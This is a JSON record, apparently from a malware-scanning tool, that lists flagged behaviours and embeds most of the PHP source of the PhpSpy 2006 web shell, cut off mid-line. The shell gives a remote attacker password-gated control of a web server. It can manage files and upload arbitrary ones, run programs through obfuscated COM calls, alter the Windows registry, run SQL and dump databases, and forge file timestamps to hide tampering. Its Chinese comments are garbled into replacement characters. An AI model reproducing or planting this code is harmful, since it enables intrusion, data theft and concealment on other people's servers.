{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Run": "May run an executable file or a system command",
            "Shell.Application": "May run an application",
            "ShellExecute": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Wscript.Shell": "May run an executable file or a system command",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "mkdir": "May create a directory",
            "popen": "May run an executable file or a system command on a Mac",
            "regread": "May read registry keys",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<?php\n/*\n+--------------------------------------------------------------------------+\n| str_replace(\".\", \"\", \"P.h.p.S.p.y\") Version:2006                         |\n| Codz by Angel                                                            |\n| (c) 2004 Security Angel Team                                             |\n| http://www.4ngel.net                                                     |\n| ======================================================================== |\n| Team:  http://www.4ngel.net                                              |\n|        http://www.bugkidz.org                                            |\n| Email: 4ngel@21cn.com                                                    |\n| Date:  Mar 21st 2005                                                     |\n| Thx All The Fantasy of Wickedness's members                              |\n| Thx FireFox (http://www.molyx.com)                                       |\n+--------------------------------------------------------------------------+\n*/\n\nerror_reporting(7);\nob_start();\n$mtime = explode(' ', microtime());\n$starttime = $mtime[1] + $mtime[0];\n\n/*===================== \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd =====================*/\n\n// \ufffd\u01f7\ufffd\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05a4,1\u03aa\ufffd\ufffd\u04aa\ufffd\ufffd\u05a4,\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03aa\u05b1\ufffd\u04fd\ufffd\ufffd\ufffd.\ufffd\ufffd\ufffd\ufffd\u0461\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0427\n$admin['check'] = \"1\";\n\n// \ufffd\ufffd\ufffd\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05a4,\ufffd\ufffd\ufffd\u07b8\u0135\ufffd\u00bd\ufffd\ufffd\ufffd\ufffd\n$admin['pass']  = \"hutuxia\";\n\n/*===================== \ufffd\ufffd\ufffd\u00fd\ufffd\ufffd\ufffd =====================*/\n\n\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd register_globals = off \ufffd\u013b\ufffd\ufffd\ufffd\ufffd\u00b9\ufffd\ufffd\ufffd\n$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');\n\nif ($onoff != 1) {\n\t@extract($_POST, EXTR_SKIP);\n\t@extract($_GET, EXTR_SKIP);\n}\n\n$self = $_SERVER['PHP_SELF'];\n$dis_func = get_cfg_var(\"disable_functions\");\n\n\n/*===================== \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05a4 =====================*/\nif($admin['check'] == \"1\") {\n\tif ($_GET['action'] == \"logout\") {\n\t\tsetcookie (\"adminpass\", \"\");\n\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"3;URL=\".$self.\"\\\">\";\n\t\techo \"<span style=\\\"font-size: 12px; font-family: Verdana\\\">\u05e2\ufffd\ufffd\ufffd\u0279\ufffd......<p><a href=\\\"\".$self.\"\\\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0536\ufffd\ufffd\u02f3\ufffd\ufffd\uda96\udd7b\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02f3\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd &gt;&gt;&gt;</a></span>\";\n\t\texit;\n\t}\n\n\tif ($_POST['do'] == 'login') {\n\t\t$thepass=trim($_POST['adminpass']);\n\t\tif ($admin['pass'] == $thepass) {\n\t\t\tsetcookie (\"adminpass\",$thepass,time()+(1*24*3600));\n\t\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"3;URL=\".$self.\"\\\">\";\n\t\t\techo \"<span style=\\\"font-size: 12px; font-family: Verdana\\\">\ufffd\ufffd\u00bd\ufffd\u0279\ufffd......<p><a href=\\\"\".$self.\"\\\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0536\ufffd\ufffd\ufffd\u05ea\ufffd\uda96\udd7b\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd &gt;&gt;&gt;</a></span>\";\n\t\t\texit;\n\t\t}\n\t}\n\tif (isset($_COOKIE['adminpass'])) {\n\t\tif ($_COOKIE['adminpass'] != $admin['pass']) {\n\t\t\tloginpage();\n\t\t}\n\t} else {\n\t\tloginpage();\n\t}\n}\n/*===================== \ufffd\ufffd\u05a4\ufffd\ufffd\ufffd\ufffd =====================*/\n\n// \ufffd\u0436\ufffd magic_quotes_gpc \u05f4\u032c\nif (get_magic_quotes_gpc()) {\n    $_GET = stripslashes_array($_GET);\n\t$_POST = stripslashes_array($_POST);\n}\n\n// \ufffd\u9ff4PHPINFO\nif ($_GET['action'] == \"phpinfo\") {\n\techo $phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? phpinfo() : \"phpinfo() \ufffd\ufffd\ufffd\ufffd\ufffd\u0471\ufffd\ufffd\ufffd\ufffd\ufffd,\ufffd\ufffd\u9ff4&lt;PHP\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&gt;\";\n\texit;\n}\n\n// \ufffd\ufffd\ufffd\u07f4\ufffd\ufffd\ufffd\nif (isset($_POST['url'])) {\n\t$proxycontents = @file_get_contents($_POST['url']);\n\techo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>\ufffd\ufffd\u0221 URL \ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd</b></p></center></body>\";\n\texit;\n}\n\n// \ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\nif (!empty($downfile)) {\n\tif (!@file_exists($downfile)) {\n\t\techo \"<script>alert('\ufffd\ufffd\u04aa\ufffd\u00b5\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd!')</script>\";\n\t} else {\n\t\t$filename = basename($downfile);\n\t\t$filename_info = explode('.', $filename);\n\t\t$fileext = $filename_info[count($filename_info)-1];\n\t\theader('Content-type: application/x-'.$fileext);\n\t\theader('Content-Disposition: attachment; filename='.$filename);\n\t\theader('Content-Description: PHP Generated Data');\n\t\theader('Content-Length: '.filesize($downfile));\n\t\t@readfile($downfile);\n\t\texit;\n\t}\n}\n\n// \u05b1\ufffd\ufffd\ufffd\ufffd\ufffd\u0631\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u077f\ufffd\nif ($_POST['backuptype'] == 'download') {\n\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"\ufffd\ufffd\ufffd\u077f\ufffd\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd\");\n\t@mysql_select_db($dbname) or die(\"\u0461\ufffd\ufffd\ufffd\ufffd\ufffd\u077f\ufffd\u02a7\ufffd\ufffd\");\t\n\t$table = array_flip($_POST['table']);\n\t$result = mysql_query(\"SHOW tables\");\n\techo ($result) ? NULL : \"\ufffd\ufffd\ufffd\ufffd: \".mysql_error();\n\n\t$filename = basename($_SERVER['HTTP_HOST'].\"_MySQL.sql\");\n\theader('Content-type: application/unknown');\n\theader('Content-Disposition: attachment; filename='.$filename);\n\t$mysqldata = '';\n\twhile ($currow = mysql_fetch_array($result)) {\n\t\tif (isset($table[$currow[0]])) {\n\t\t\t$mysqldata.= sqldumptable($currow[0]);\n\t\t\t$mysqldata.= $mysqldata.\"\\r\\n\";\n\t\t}\n\t}\n\tmysql_close();\n\texit;\n}\n\n// \ufffd\ufffd\ufffd\ufffd\u013f\u00bc\n$pathname=str_replace('\\\\','/',dirname(__FILE__)); \n\n// \ufffd\ufffd\u0221\ufffd\ufffd\u01f0\u00b7\ufffd\ufffd\nif (!isset($dir) or empty($dir)) {\n\t$dir = \".\";\n\t$nowpath = getPath($pathname, $dir);\n} else {\n\t$dir=$_GET['dir'];\n\t$nowpath = getPath($pathname, $dir);\n}\n\n// \ufffd\u0436\u03f6\ufffd\u0434\ufffd\ufffd\ufffd\n$dir_writeable = (dir_writeable($nowpath)) ? \"\ufffd\ufffd\u0434\" : \"\ufffd\ufffd\ufffd\ufffd\u0434\";\n$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";\n$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? \" | <a href=\\\"?action=reg\\\">\u05e2\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</a>\" : \"\";\n\n$tb = new FORMS;\n\n?>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">\n<title>PhpSpy Ver 2006</title>\n<style type=\"text/css\">\nbody,td {\n\tfont-family: \"Tahoma\";\n\tfont-size: \"12px\";\n\tline-height: \"150%\";\n}\n.smlfont {\n\tfont-family: \"Tahoma\";\n\tfont-size: \"11px\";\n}\n.INPUT {\n\tFONT-SIZE: \"12px\";\n\tCOLOR: \"#000000\";\n\tBACKGROUND-COLOR: \"#FFFFFF\";\n\theight: \"18px\";\n\tborder: \"1px solid #666666\";\n\tpadding-left: \"2px\";\n}\n.redfont {\n\tCOLOR: \"#A60000\";\n}\na:link,a:visited,a:active {\n\tcolor: \"#000000\";\n\ttext-decoration: underline;\n}\na:hover {\n\tcolor: \"#465584\";\n\ttext-decoration: none;\n}\n.top {BACKGROUND-COLOR: \"#CCCCCC\"}\n.firstalt {BACKGROUND-COLOR: \"#EFEFEF\"}\n.secondalt {BACKGROUND-COLOR: \"#F5F5F5\"}\n</style>\n<SCRIPT language=JavaScript>\nfunction CheckAll(form) {\n\tfor (var i=0;i<form.elements.length;i++) {\n\t\tvar e = form.elements[i];\n\t\tif (e.name != 'chkall')\n\t\te.checked = form.chkall.checked;\n    }\n}\nfunction really(d,f,m,t) {\n\tif (confirm(m)) {\n\t\tif (t == 1) {\n\t\t\twindow.location.href='?dir='+d+'&deldir='+f;\n\t\t} else {\n\t\t\twindow.location.href='?dir='+d+'&delfile='+f;\n\t\t}\n\t}\n}\n</SCRIPT>\n</head>\n\n<body style=\"table-layout:fixed; word-break:break-all\">\n<center>\n<?php\n$tb->tableheader();\n$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align=\"right\"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');\n$tb->tdbody('<a href=\"?action=logout\">\u05e2\ufffd\ufffd\ufffd\u1ef0</a> | <a href=\"?action=dir\">\ufffd\ufffd\ufffd\ufffdPhpSpy\u013f\u00bc</a> | <a href=\"?action=phpenv\">PHP\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</a> | <a href=\"?action=proxy\">\ufffd\ufffd\ufffd\u07f4\ufffd\ufffd\ufffd</a>'.$reg.$phpinfo.' | <a href=\"?action=shell\">WebShell</a> | <a href=\"?action=sql\">SQL Query</a> | <a href=\"?action=sqlbak\">MySQL Backup</a>');\n$tb->tablefooter();\n?>\n<hr width=\"775\" noshade>\n<table width=\"775\" border=\"0\" cellpadding=\"0\">\n<?\n$tb->headerform(array('method'=>'GET','content'=>'<p>\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd: '.$pathname.'<br>\ufffd\ufffd\u01f0\u013f\u00bc('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>\ufffd\ufffd\u05ea\u013f\u00bc: '.$tb->makeinput('dir').' '.$tb->makeinput('','\u0237\ufffd\ufffd','','submit').' \ufffd\ufffd\u05a7\ufffd\u05be\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd'));\n\n$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'\ufffd\u03f4\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\u01f0\u013f\u00bc: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','\u0237\ufffd\ufffd','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));\n\n$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'\ufffd\u00bd\ufffd\ufffd\u013c\ufffd\ufffd\u06b5\ufffd\u01f0\u013f\u00bc: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','\u0237\ufffd\ufffd','','submit')));\n\n$tb->headerform(array('content'=>'\ufffd\u00bd\ufffd\u013f\u00bc\ufffd\u06b5\ufffd\u01f0\u013f\u00bc: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','\u0237\ufffd\ufffd','','submit')));\n?>\n</table>\n<hr width=\"775\" noshade>\n<?php\n/*===================== \u05b4\ufffd\u0432\ufffd\ufffd\ufffd \ufffd\ufffd\u02bc =====================*/\necho \"<p><b>\\n\";\n// \u027e\ufffd\ufffd\ufffd\u013c\ufffd\nif (!empty($delfile)) {\n\tif (file_exists($delfile)) {\n\t\techo (@unlink($delfile)) ? $delfile.\" \u027e\ufffd\ufffd\ufffd\u0279\ufffd!\" : \"\ufffd\u013c\ufffd\u027e\ufffd\ufffd\u02a7\ufffd\ufffd!\";\n\t} else {\n\t\techo basename($delfile).\" \ufffd\u013c\ufffd\ufffd\u0472\ufffd\ufffd\ufffd\ufffd\ufffd!\";\n\t}\n}\n\n// \u027e\ufffd\ufffd\u013f\u00bc\nelseif (!empty($deldir)) {\n\t$deldirs=\"$dir/$deldir\";\n\tif (!file_exists(\"$deldirs\")) {\n\t\techo \"$deldir \u013f\u00bc\ufffd\u0472\ufffd\ufffd\ufffd\ufffd\ufffd!\";\n\t} else {\n\t\techo (deltree($deldirs)) ? \"\u013f\u00bc\u027e\ufffd\ufffd\ufffd\u0279\ufffd!\" : \"\u013f\u00bc\u027e\ufffd\ufffd\u02a7\ufffd\ufffd!\";\n\t}\n}\n\n// \ufffd\ufffd\ufffd\ufffd\u013f\u00bc\nelseif (($createdirectory) AND !empty($_POST['newdirectory'])) {\n\tif (!empty($newdirectory)) {\n\t\t$mkdirs=\"$dir/$newdirectory\";\n\t\tif (file_exists(\"$mkdirs\")) {\n\t\t\techo \"\ufffd\ufffd\u013f\u00bc\ufffd\u0474\ufffd\ufffd\ufffd!\";\n\t\t} else {\n\t\t\techo (@mkdir(\"$mkdirs\",0777)) ? \"\ufffd\ufffd\ufffd\ufffd\u013f\u00bc\ufffd\u0279\ufffd!\" : \"\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd!\";\n\t\t\t@chmod(\"$mkdirs\",0777);\n\t\t}\n\t}\n}\n\n// \ufffd\u03f4\ufffd\ufffd\u013c\ufffd\nelseif ($doupfile) {\n\techo (@copy($_FILES['uploadfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadfile']['name'].\"\")) ? \"\ufffd\u03f4\ufffd\ufffd\u0279\ufffd!\" : \"\ufffd\u03f4\ufffd\u02a7\ufffd\ufffd!\";\n}\n\n// \ufffd\u0f2d\ufffd\u013c\ufffd\nelseif ($_POST['do'] == 'doeditfile') {\n\tif (!empty($_POST['editfilename'])) {\n\t\t$filename=\"$editfilename\";\n\t\t@$fp=fopen(\"$filename\",\"w\");\n\t\techo $msg=@fwrite($fp,$_POST['filecontent']) ? \"\u0434\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\u0279\ufffd!\" : \"\u0434\ufffd\ufffd\u02a7\ufffd\ufffd!\";\n\t\t@fclose($fp);\n\t} else {\n\t\techo \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04aa\ufffd\u0f2d\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd!\";\n\t}\n}\n\n// \ufffd\u0f2d\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\nelseif ($_POST['do'] == 'editfileperm') {\n\tif (!empty($_POST['fileperm'])) {\n\t\t$fileperm=base_convert($_POST['fileperm'],8,10);\n\t\techo (@chmod($dir.\"/\".$file,$fileperm)) ? \"\ufffd\ufffd\ufffd\ufffd\ufffd\u07b8\u0133\u0279\ufffd!\" : \"\ufffd\u07b8\ufffd\u02a7\ufffd\ufffd!\";\n\t\techo \" \ufffd\u013c\ufffd \".$file.\" \ufffd\u07b8\u013a\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03aa: \".substr(base_convert(@fileperms($dir.\"/\".$file),10,8),-4);\n\t} else {\n\t\techo \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\u00f5\ufffd\ufffd\ufffd\ufffd\ufffd!\";\n\t}\n}\n\n// \ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\nelseif ($_POST['do'] == 'rename') {\n\tif (!empty($_POST['newname'])) {\n\t\t$newname=$_POST['dir'].\"/\".$_POST['newname'];\n\t\tif (@file_exists($newname)) {\n\t\t\techo \"\".$_POST['newname'].\" \ufffd\u047e\ufffd\ufffd\ufffd\ufffd\ufffd,\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffd!\";\n\t\t} else {\n\t\t\techo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname']).\" \ufffd\u0279\ufffd\ufffd\ufffd\ufffd\ufffd\u03aa \".$_POST['newname'].\" !\" : \"\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd\u02a7\ufffd\ufffd!\";\n\t\t}\n\t} else {\n\t\techo \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04aa\ufffd\u0135\ufffd\ufffd\u013c\ufffd\ufffd\ufffd!\";\n\t}\n}\n\n// \ufffd\ufffd\u00a1\u02b1\ufffd\ufffd\nelseif ($_POST['do'] == 'domodtime') {\n\tif (!@file_exists($_POST['curfile'])) {\n\t\techo \"\u04aa\ufffd\u07b8\u0135\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd!\";\n\t} else {\n\t\tif (!@file_exists($_POST['tarfile'])) {\n\t\t\techo \"\u04aa\ufffd\ufffd\ufffd\u0575\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd!\";\n\t\t} else {\n\t\t\t$time=@filemtime($_POST['tarfile']);\n\t\t\techo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile']).\" \ufffd\ufffd\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd\u0279\ufffd\ufffd\ufffd\u03aa \".date(\"Y-m-d H:i:s\",$time).\" !\" : \"\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd\ufffd\u07b8\ufffd\u02a7\ufffd\ufffd!\";\n\t\t}\n\t}\n}\n\n// \ufffd\u0536\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd\nelseif ($_POST['do'] == 'modmytime') {\n\tif (!@file_exists($_POST['curfile'])) {\n\t\techo \"\u04aa\ufffd\u07b8\u0135\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd!\";\n\t} else {\n\t\t$year=$_POST['year'];\n\t\t$month=$_POST['month'];\n\t\t$data=$_POST['data'];\t\t\n\t\t$hour=$_POST['hour'];\n\t\t$minute=$_POST['minute'];\n\t\t$second=$_POST['second'];\n\t\tif (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {\n\t\t\t$time=strtotime(\"$data $month $year $hour:$minute:$second\");\n\t\t\techo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile']).\" \ufffd\ufffd\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd\u0279\ufffd\ufffd\ufffd\u03aa \".date(\"Y-m-d H:i:s\",$time).\" !\" : \"\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd\ufffd\u07b8\ufffd\u02a7\ufffd\ufffd!\";\n\t\t}\n\t}\n}\n\n// \ufffd\ufffd\ufffd\ufffdMYSQL\nelseif ($connect) {\n\tif (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {\n\t\techo \"\ufffd\ufffd\ufffd\u077f\ufffd\ufffd\ufffd\ufffd\u04f3\u0279\ufffd!\";\n\t\tmysql_close();\n\t} else {\n\t\techo mysql_error();\n\t}\n}\n\n// \u05b4\ufffd\ufffdSQL\ufffd\ufffd\ufffd\nelseif ($_POST['do'] == 'query') {\n\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"\ufffd\ufffd\ufffd\u077f\ufffd\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd\");\n\t@mysql_select_db($dbname) or die(\"\u0461\ufffd\ufffd\ufffd\ufffd\ufffd\u077f\ufffd\u02a7\ufffd\ufffd\");\n\t$result = @mysql_query($_POST['sql_query']);\n\techo ($result) ? \"SQL\ufffd\ufffd\ufffd\u0279\ufffd\u05b4\ufffd\ufffd!\" : \"\ufffd\ufffd\ufffd\ufffd: \".mysql_error();\n\tmysql_close();\n}\n\n// \ufffd\ufffd\ufffd\u0772\ufffd\ufffd\ufffd\nelseif ($_POST['do'] == 'backupmysql') {\n\tif (empty($_POST['table']) OR empty($_POST['backuptype'])) {\n\t\techo \"\ufffd\ufffd\u0461\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0775\ufffd\ufffd\ufffd\ufffd\u0771\ufffd\ufffd\u0371\ufffd\ufffd\u0777\ufffd\u02bd!\";\n\t} else {\n\t\tif ($_POST['backuptype'] == 'server') {\n\t\t\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"\ufffd\ufffd\ufffd\u077f\ufffd\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd\");\n\t\t\t@mysql_select_db($dbname) or die(\"\u0461\ufffd\ufffd\ufffd\ufffd\ufffd\u077f\ufffd\u02a7\ufffd\ufffd\");\t\n\t\t\t$table = array_flip($_POST['table']);\n\t\t\t$filehandle = @fopen($path,\"w\");\n\t\t\tif ($filehandle) {\n\t\t\t\t$result = mysql_query(\"SHOW tables\");\n\t\t\t\techo ($result) ? NULL : \"\ufffd\ufffd\ufffd\ufffd: \".mysql_error();\n\t\t\t\twhile ($currow = mysql_fetch_array($result)) {\n\t\t\t\t\tif (isset($table[$currow[0]])) {\n\t\t\t\t\t\tsqldumptable($currow[0], $filehandle);\n\t\t\t\t\t\tfwrite($filehandle,\"\\n\\n\\n\");\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tfclose($filehandle);\n\t\t\t\techo \"\ufffd\ufffd\ufffd\u077f\ufffd\ufffd\u0473\u0279\ufffd\ufffd\ufffd\ufffd\u0775\ufffd <a href=\\\"\".$path.\"\\\" target=\\\"_blank\\\">\".$path.\"</a>\";\n\t\t\t\tmysql_close();\n\t\t\t} else {\n\t\t\t\techo \"\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd,\ufffd\ufffd\u0237\ufffd\ufffd\u013f\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\u01f7\ufffd\ufffd\ufffd\u043f\ufffd\u0434\u0228\ufffd\ufffd!\";\n\t\t\t}\n\t\t}\n\t}\n}\n\n// \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd PS:\ufffd\u013c\ufffd\u032b\ufffd\ufffd\ufffd\ufffd\u0737\u01f3\ufffd\ufffd\ufffd\n// Thx : \u0421\ufffd\ufffd\nelseif($downrar) {\n\tif (!empty($dl)) {\n\t\t$dfiles=\"\";\n\t\tforeach ($dl AS $filepath=>$value) {\n\t\t\t$dfiles.=$filepath.\",\";\n\t\t}\n\t\t$dfiles=substr($dfiles,0,strlen($dfiles)-1);\n\t\t$dl=explode(\",\",$dfiles);\n\t\t$zip=new PHPZip($dl);\n\t\t$code=$zip->out;\t\t\n\t\theader(\"Content-type: application/octet-stream\");\n\t\theader(\"Accept-Ranges: bytes\");\n\t\theader(\"Accept-Length: \".strlen($code));\n\t\theader(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");\n\t\techo $code;\n\t\texit;\n\t} else {\n\t\techo \"\ufffd\ufffd\u0461\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0635\ufffd\ufffd\u013c\ufffd!\";\n\t}\n}\n\n// Shell.Application \ufffd\ufffd\ufffd\u0433\ufffd\ufffd\ufffd\nelseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {\n\t$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');\n\t$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);\n\techo ($a=='0') ? \"\ufffd\ufffd\ufffd\ufffd\ufffd\u047e\ufffd\ufffd\u0279\ufffd\u05b4\ufffd\ufffd!\" : \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd!\";\n}\n\n// \ufffd\u9ff4PHP\ufffd\ufffd\ufffd\u00f2\ufffd\ufffd\ufffd\u05f4\ufffd\ufffd\nelseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {\n\techo \"\ufffd\ufffd\ufffd\u00f2\ufffd\ufffd\ufffd \".$_POST['phpvarname'].\" \ufffd\ufffd\ufffd\ufffd\ufffd: \".getphpcfg($_POST['phpvarname']).\"\";\n}\n\n// \ufffd\ufffd\u0221\u05e2\ufffd\ufffd\ufffd\nelseif(($regread) AND !empty($_POST['readregname'])) {\n\t$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');\n\tvar_dump(@$shell->RegRead($_POST['readregname']));\n}\n\n// \u0434\ufffd\ufffd\u05e2\ufffd\ufffd\ufffd\nelseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {\n\t$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');\n\t$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);\n\techo ($a=='0') ? \"\u0434\ufffd\ufffd\u05e2\ufffd\ufffd\ufffd\ufffd\ufffd\u05b5\ufffd\u0279\ufffd!\" : \"\u0434\ufffd\ufffd \".$_POST['regname'].\", \".$_POST['regval'].\", \".$_POST['regtype'].\" \u02a7\ufffd\ufffd!\";\n}\n\n// \u027e\ufffd\ufffd\u05e2\ufffd\ufffd\ufffd\nelseif(($regdelete) AND !empty($_POST['delregname'])) {\n\t$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');\n\t$a = @$shell->RegDelete($_POST['delregname']);\n\techo ($a=='0') ? \"\u027e\ufffd\ufffd\u05e2\ufffd\ufffd\ufffd\ufffd\ufffd\u05b5\ufffd\u0279\ufffd!\" : \"\u027e\ufffd\ufffd \".$_POST['delregname'].\" \u02a7\ufffd\ufffd!\";\n}\n\nelse {\n\techo \"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> \u0421\ufffd\ufffd angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd,\ufffd\ufffd\ufffd\ufffd <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b0\u6c7e.\";\n}\n\necho \"</b></p>\\n\";\n/*===================== \u05b4\ufffd\u0432\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd =====================*/\n\nif (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"dir\")) {\n\t$tb->tableheader();\n?>\n  <tr bgcolor=\"#cccccc\">\n    <td align=\"center\" nowrap width=\"27%\"><b>\ufffd\u013c\ufffd</b></td>\n\t<td align=\"center\" nowrap width=\"16%\"><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></td>\n    <td align=\"center\" nowrap width=\"16%\"><b>\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd</b></td>\n    <td align=\"center\" nowrap width=\"11%\"><b>\ufffd\ufffd\u0421</b></td>\n    <td align=\"center\" nowrap width=\"6%\"><b>\ufffd\ufffd\ufffd\ufffd</b></td>\n    <td align=\"center\" nowrap width=\"24%\"><b>\ufffd\ufffd\ufffd\ufffd</b></td>\n  </tr>\n<?php\n// \u013f\u00bc\ufffd\u0431\ufffd\n$dirs=@opendir($dir);\n$dir_i = '0';\nwhile ($file=@readdir($dirs)) {\n\t$filepath=\"$dir/$file\";\n\t$a=@is_dir($filepath);\n\tif($a==\"1\"){\n\t\tif($file!=\"..\" && $file!=\".\")\t{\n\t\t\t$ctime=@date(\"Y-m-d H:i:s\",@filectime($filepath));\n\t\t\t$mtime=@date(\"Y-m-d H:i:s\",@filemtime($filepath));\n\t\t\t$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);\n\t\t\techo \"<tr class=\".getrowbg().\">\\n\";\n\t\t\techo \"  <td 